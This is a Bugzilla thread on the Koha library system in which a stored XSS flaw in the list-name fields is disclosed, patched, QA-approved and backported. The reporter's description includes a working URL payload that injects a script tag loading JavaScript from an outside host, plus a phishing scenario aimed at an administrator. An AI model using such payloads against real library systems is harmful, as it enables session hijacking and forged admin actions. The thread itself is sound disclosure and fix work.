| | Reported: | 2015-06-18 18:18 UTC by Raschin Tavakoli | | --- | --- | | Modified: | 2017-06-14 22:11 UTC ([History](show_activity.cgi?id=14416)) | | CC List: | 10 users (show)  chris fridolin.somers jonathan.druart liz m.de.rooy martin.renvoize mtj RGhanad-Tavakoli robin tomascohen | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Change sponsored?:](page.cgi?id=fields.html#cf_sponsorship "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Patch complexity:](page.cgi?id=fields.html#cf_patch_complexity "A custom Drop Down field in this installation of Bugzilla.") | Small patch | | [Documentation contact:](page.cgi?id=fields.html#cf_docs_contact "The person taking responsibility for documenting the change introduced in this bug.") |  | | [Documentation submission:](page.cgi?id=fields.html#cf_manual "gitlab merge request url for this documentation submission") |  | | [Text to go in the release notes:](page.cgi?id=fields.html#cf_release_notes "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Version(s) released in:](page.cgi?id=fields.html#cf_release_version "A custom Large Text Box field in this installation of Bugzilla.") |  | | [Circulation function:](page.cgi?id=fields.html#cf_circulation_subcomponent "A custom Multiple-Selection Box field in this installation of Bugzilla.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Screenshots with Exploit Scenario**](attachment.cgi?id=40333 "View the content of the attachment") (811.36 KB, application/x-compressed-tar)  [2015-06-18 18:40 UTC](#attach_40333 "Go to the comment associated with the attachment"), Raschin Tavakoli | [Details](attachment.cgi?id=40333&action=edit) | | [**Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40340 "View the content of the attachment") (2.05 KB, patch)  [2015-06-18 23:03 UTC](#attach_40340 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40340&action=edit) | [Diff](attachment.cgi?id=40340&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40340) | | [**Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40341 "View the content of the attachment") (2.38 KB, patch)  [2015-06-18 23:28 UTC](#attach_40341 "Go to the comment associated with the attachment"), Chris Cormack | [Details](attachment.cgi?id=40341&action=edit) | [Diff](attachment.cgi?id=40341&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40341) | | [**Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40353 "View the content of the attachment") (2.11 KB, patch)  [2015-06-19 09:22 UTC](#attach_40353 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40353&action=edit) | [Diff](attachment.cgi?id=40353&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40353) | | [**Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40354 "View the content of the attachment") (2.45 KB, patch)  [2015-06-19 09:23 UTC](#attach_40354 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40354&action=edit) | [Diff](attachment.cgi?id=40354&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40354) | | [**Bug 14416: (follow-up) opac addbybilionumber**](attachment.cgi?id=40355 "View the content of the attachment") (1.66 KB, patch)  [2015-06-19 09:23 UTC](#attach_40355 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40355&action=edit) | [Diff](attachment.cgi?id=40355&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40355) | | [**Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)**](attachment.cgi?id=40356 "View the content of the attachment") (2.28 KB, patch)  [2015-06-19 09:23 UTC](#attach_40356 "Go to the comment associated with the attachment"), Jonathan Druart | [Details](attachment.cgi?id=40356&action=edit) | [Diff](attachment.cgi?id=40356&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40356) | | [**[PASSED QA] Bug 14416 : Stored XSS vulnerability**](attachment.cgi?id=40370 "View the content of the attachment") (2.18 KB, patch)  [2015-06-19 13:27 UTC](#attach_40370 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40370&action=edit) | [Diff](attachment.cgi?id=40370&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40370) | | [**[PASSED QA] Bug 14416 Stored XSS vulnerability**](attachment.cgi?id=40371 "View the content of the attachment") (2.52 KB, patch)  [2015-06-19 13:28 UTC](#attach_40371 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40371&action=edit) | [Diff](attachment.cgi?id=40371&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40371) | | [**[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber**](attachment.cgi?id=40372 "View the content of the attachment") (1.73 KB, patch)  [2015-06-19 13:29 UTC](#attach_40372 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40372&action=edit) | [Diff](attachment.cgi?id=40372&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40372) | | [**[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)**](attachment.cgi?id=40373 "View the content of the attachment") (2.35 KB, patch)  [2015-06-19 13:29 UTC](#attach_40373 "Go to the comment associated with the attachment"), Katrin Fischer | [Details](attachment.cgi?id=40373&action=edit) | [Diff](attachment.cgi?id=40373&action=diff) | [Splinter Review](https://bugs.koha-community.org/bugzilla3/page.cgi?id=splinter.html&bug=14416&attachment=40373) | | [Show Obsolete](#a0) (6) [View All](attachment.cgi?bugid=14416&action=viewall&hide_obsolete=1)  [Add an attachment](attachment.cgi?bugid=14416&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=14416&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=14416#c0)  Raschin Tavakoli    2015-06-18 18:18:40 UTC  ``` We found a Stored XSS flaw in the Koha Library which could allow remote attackers to execute arbritrary code via XSRF.  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>   Example Scenario:  Student Alice receives a phishing mail and clicks the following:  /cgi-bin/koha/opac-shelves.pl?shelves=1&addshelf=Malicious+Input+%3Cscript+src%3D%27http%3A%2F%2Fcst.sba-research.org%2Fx.js%27%2F%3E&owner=7854&sortfield=title&category=2&allow_add=0&allow_delete_own=1&allow_delete_other=0  Bob, library admin, recognizes the new malicious list entry. He logs into the staff area and browses the public lists in order to delete the entry. Once he opens   <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  the malcious code get's executed. It then could either target bob's browser or even perform an XSRF attack by exploiting other server-side vulnerabilities.  Side note:  In order to make the attack work, alice only needs to have access to the OPAC interface and to have permissions to create public lists. ---  Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research. Contact: cst@sba-research.org ```  [Comment 1](show_bug.cgi?id=14416#c1)  Raschin Tavakoli    2015-06-18 18:40:30 UTC  ``` Created [attachment 40333](attachment.cgi?id=40333 "Screenshots with Exploit Scenario") [[details]](attachment.cgi?id=40333&action=edit "Screenshots with Exploit Scenario") Screenshots with Exploit Scenario  The screenshots show the input in the OPAC interface (victim1 - alice), the target victim in the Staff client (bob), and the permissions page of alice and bob.  As we can see, alice, has very restricted permissions various bob has superlibrarian permissions set. ```  [Comment 2](show_bug.cgi?id=14416#c2)  Chris Cormack    2015-06-18 18:55:01 UTC  ``` *** [Bug 14415](show_bug.cgi?id=14415 "RESOLVED DUPLICATE") has been marked as a duplicate of this bug. *** ```   [Comment 3](show_bug.cgi?id=14416#c3)  Chris Cormack    2015-06-18 23:03:55 UTC  Comment hidden (obsolete)  ``` Created [attachment 40340](attachment.cgi?id=40340&action=diff "Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40340&action=edit "Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40340) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit ```   [Comment 4](show_bug.cgi?id=14416#c4)  Chris Cormack    2015-06-18 23:28:02 UTC  Comment hidden (obsolete)  ``` Created [attachment 40341](attachment.cgi?id=40341&action=diff "Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40341&action=edit "Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40341) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again ```   [Comment 5](show_bug.cgi?id=14416#c5)  Jonathan Druart    2015-06-19 09:22:56 UTC  Comment hidden (obsolete)  ``` Created [attachment 40353](attachment.cgi?id=40353&action=diff "Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40353&action=edit "Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40353) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 6](show_bug.cgi?id=14416#c6)  Jonathan Druart    2015-06-19 09:23:03 UTC  Comment hidden (obsolete)  ``` Created [attachment 40354](attachment.cgi?id=40354&action=diff "Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40354&action=edit "Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40354) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 7](show_bug.cgi?id=14416#c7)  Jonathan Druart    2015-06-19 09:23:06 UTC  Comment hidden (obsolete)  ``` Created [attachment 40355](attachment.cgi?id=40355&action=diff "Bug 14416: (follow-up) opac addbybilionumber") [[details]](attachment.cgi?id=40355&action=edit "Bug 14416: (follow-up) opac addbybilionumber") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40355) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): (follow-up) opac addbybilionumber  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```   [Comment 8](show_bug.cgi?id=14416#c8)  Jonathan Druart    2015-06-19 09:23:10 UTC  Comment hidden (obsolete)  ``` Created [attachment 40356](attachment.cgi?id=40356&action=diff "Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[details]](attachment.cgi?id=40356&action=edit "Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40356) [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): Stored XSS vulnerability - add biblio to shelf (intranet)  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> ```  [Comment 9](show_bug.cgi?id=14416#c9)  Jonathan Druart    2015-06-19 09:23:57 UTC  ``` Found 2 more at the OPAC and I submitted a patch for the intranet side (which was affected too). ```  [Comment 10](show_bug.cgi?id=14416#c10)  Jonathan Druart    2015-06-19 09:25:38 UTC  ``` if ( $var =~ m|<script>| ) {     $template->param( error => "CONVOKE_STUDENT" ); }  :) ```  [Comment 11](show_bug.cgi?id=14416#c11)  Katrin Fischer    2015-06-19 13:27:26 UTC  ``` Created [attachment 40370](attachment.cgi?id=40370&action=diff "[PASSED QA] Bug 14416 : Stored XSS vulnerability") [[details]](attachment.cgi?id=40370&action=edit "[PASSED QA] Bug 14416 : Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40370) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") : Stored XSS vulnerability  The affected page in the OPAC client is: <http://testbox:9001/cgi-bin/koha/opac-shelves.pl> the vulnerable parameter: addshelf  The affected page in the STAFF client is: <http://testbox:9002/cgi-bin/koha/virtualshelves/shelves.pl>  To test: 1/ Create a shelf in the opac that contains some malicious js  eg Bad stuff <script>alert('oh noes');</script> as the name 2/ Go to /cgi-bin/koha/virtualshelves/shelves.pl in the staff client   Note the js is executed 3/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is not escaped 4/ Apply patch 5/ View <http://192.168.2.18:8080/cgi-bin/koha/svc/virtualshelves/search?template_path=virtualshelves/tables/shelves_results.tt&type=1>   Notice the html is now escaped 6/ View /cgi-bin/koha/virtualshelves/shelves.pl - no more exploit  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 12](show_bug.cgi?id=14416#c12)  Katrin Fischer    2015-06-19 13:28:45 UTC  ``` Created [attachment 40371](attachment.cgi?id=40371&action=diff "[PASSED QA] Bug 14416 Stored XSS vulnerability") [[details]](attachment.cgi?id=40371&action=edit "[PASSED QA] Bug 14416 Stored XSS vulnerability") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40371) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface") Stored XSS vulnerability  opac-addbybiblionumber.pl is also vulnerable because it doesn't escape list names.  To test 1/ Create a malicious list name 2/ Try to add a biblio to the lists 3/ Notice js is excuted 4/ Apply patch 5/ Test again  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 13](show_bug.cgi?id=14416#c13)  Katrin Fischer    2015-06-19 13:29:11 UTC  ``` Created [attachment 40372](attachment.cgi?id=40372&action=diff "[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber") [[details]](attachment.cgi?id=40372&action=edit "[PASSED QA] Bug 14416: (follow-up) opac addbybilionumber") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40372) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): (follow-up) opac addbybilionumber  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 14](show_bug.cgi?id=14416#c14)  Katrin Fischer    2015-06-19 13:29:35 UTC  ``` Created [attachment 40373](attachment.cgi?id=40373&action=diff "[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[details]](attachment.cgi?id=40373&action=edit "[PASSED QA] Bug 14416: Stored XSS vulnerability - add biblio to shelf (intranet)") [[review]](page.cgi?id=splinter.html&bug=14416&attachment=40373) [PASSED QA] [Bug 14416](show_bug.cgi?id=14416 "CLOSED FIXED - Stored XSS flaw affects OPAC and Staff interface"): Stored XSS vulnerability - add biblio to shelf (intranet)  Signed-off-by: Jonathan Druart <jonathan.druart@koha-community.org> Signed-off-by: Katrin Fischer <katrin.fischer@bsz-bw.de> ```  [Comment 15](show_bug.cgi?id=14416#c15)  Tomás Cohen Arazi (tcohen)    2015-06-22 14:39:06 UTC  ``` Patches pushed to master. Good job Chris! ```  [Comment 16](show_bug.cgi?id=14416#c16)  Chris Cormack    2015-06-22 21:42:49 UTC  ``` Pushed to 3.20.x will be in 3.20.1 ```  [Comment 17](show_bug.cgi?id=14416#c17)  Fridolin Somers    2015-06-23 09:27:15 UTC  ``` Pushed to 3.14.x, will be in 3.14.16 ```  [Comment 18](show_bug.cgi?id=14416#c18)  Mason James    2015-06-23 14:03:24 UTC  ``` Pushed to 3.16.x, will be in 3.16.12 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=14416)
* - [XML](show_bug.cgi?ctype=xml&id=14416)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=14416)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.2/using/understanding.html)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=14416&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=14416&GoAheadAndLogIn=1#forgot)
    Login:

    [x]


